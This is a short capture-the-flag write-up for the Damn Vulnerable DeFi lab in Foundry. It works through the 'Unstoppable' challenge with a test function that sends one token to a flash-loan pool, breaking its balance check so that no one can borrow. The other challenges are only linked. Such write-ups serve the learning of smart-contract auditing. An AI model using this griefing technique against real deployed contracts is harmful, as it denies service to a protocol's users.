# Damn Vulnerable Defi Foundry Writeup #

Hi, my name is Juan,  i wrote this writeup to help anybody interested in develop Smart contract auditing skills. I previously resolved other challenges as Ethernaut and CaptureTheEther so i recommend try them before get into this more advanced Defi challenges so i will asume you have a previous basic knowledge.

Any comments/corrections please reach me at my twitter account: **@devnet0x**

## Challenge 1: Unstoppable ##
We as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore in this line from function flashloan():
        
        if (poolBalance != balanceBefore) revert AssertionViolated();
        
        

Then, nobody else will be able to borrow a flashloan:

```
   function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        // We (attacker) transfer 1 token to lender pool to create a difference
        // between poolBalance and balanceBefore in this line from function flashloan():
        //
        // if (poolBalance != balanceBefore) revert AssertionViolated();
        //
        dvt.transfer(address(unstoppableLender), 1 ether);
        vm.stopPrank();
        /** EXPLOIT END **/
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01_Unstoppable

## Challenge 2: NaiveReceiver ##

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver

## Challenge 3: Truster ##

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03_Truster

## Challenge 4: SideEntrance ##

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/04_SideEntrance
